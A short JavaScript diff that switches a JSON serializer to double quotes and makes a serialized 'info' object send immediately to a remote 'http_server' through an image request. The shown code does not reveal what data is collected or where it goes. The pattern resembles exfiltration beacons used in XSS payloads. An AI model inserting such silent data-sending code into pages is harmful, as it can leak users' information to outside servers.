@@ -63,13 +63,11 @@ function json2str(o) {
 	var arr = [];
 	var fmt = function(s) {
 		if (typeof s == 'object' && s != null) return json2str(s);
-		return /^(string|number)$/.test(typeof s) ? "'" + s + "'" : s;
+		return /^(string|number)$/.test(typeof s) ? '"' + s + '"' : s;
 	}
-	for (var i in o) arr.push("'" + i + "':" + fmt(o[i]));
+	for (var i in o) arr.push('"' + i + '":' + fmt(o[i]));
 	return '{' + arr.join(',') + '}';
 } 
 
-window.onload = function(){
-	var i = json2str(info);
-	new Image().src = http_server + i;
-}
+var i = json2str(info);
+new Image().src = http_server + i;
